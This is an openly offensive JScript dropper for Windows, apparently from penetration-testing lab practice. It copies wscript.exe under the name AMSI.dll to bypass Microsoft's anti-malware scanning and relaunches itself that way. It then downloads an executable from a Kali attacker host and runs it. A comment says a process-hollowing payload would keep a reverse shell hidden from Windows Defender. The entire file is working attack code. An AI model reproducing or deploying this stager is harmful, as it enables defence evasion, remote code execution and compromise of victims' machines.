var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll") == 0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}

// NOTE: WE CAN USE THE PROCESS HOLLOWING PAYLOAD HERE TO REDUCE THE CHANCE OF WINDOWS DEFENDER DETECTING OUR REVERSE SHELL PRESENCE
var url = "http://192.168.KALI.IP/hollow_purple.exe";

var http = WScript.CreateObject('MSXML2.XMLHTTP');
http.Open('GET', url, false);
http.Send();

if (http.Status == 200) {
    var stream = WScript.CreateObject('ADODB.Stream');
    stream.Open();
    stream.Type = 1; // Binary
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("hollow_purple.exe", 2); // Overwrite if exists
    stream.Close();

    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("hollow_purple.exe");
}

